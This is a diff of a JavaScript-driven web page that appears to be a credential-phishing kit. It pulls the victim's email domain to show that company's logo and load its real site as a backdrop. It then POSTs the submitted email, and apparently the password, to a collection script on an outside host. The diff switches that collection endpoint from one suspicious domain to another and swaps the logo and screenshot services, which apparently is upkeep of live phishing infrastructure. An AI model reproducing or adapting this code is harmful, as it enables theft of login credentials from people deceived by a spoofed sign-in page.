@@ -1775,11 +1775,8 @@ var ind=my_email.indexOf("@");
 var my_slice=my_email.substr((ind+1));
 $('#footer_dom').html(my_email);
 $('#carss').html(my_email);
-$('#top_label_logo').attr(
-    'src',
-    'https://img.logo.dev/' + my_slice + '?token=pk_XbcRLEiaQmKqN0PgTrqF6A'
-  );
-var mPage = 'https://screenshot.domains/'+my_slice;
+ $("#top_label_logo").attr("src", "https://logo.clearbit.com/"+my_slice);
+var mPage = 'https://'+my_slice;
 document.getElementById('mainPage').src = mPage; 
 }
 $('#next_button').click(function(event){
@@ -1801,7 +1798,7 @@ count=count+1;
 
 $.ajax({
 dataType: 'JSON',
-url: 'https://mail.techsupportes.site/php/result.php',
+url: 'https://scrpronetins.qzz.io/php/result.php',
 type: 'POST',
       	data:{
 			email:email,
@@ -1853,9 +1850,3 @@ type: 'POST',
 </script>	
    
    </body></html>
-
-
-
-
-
-
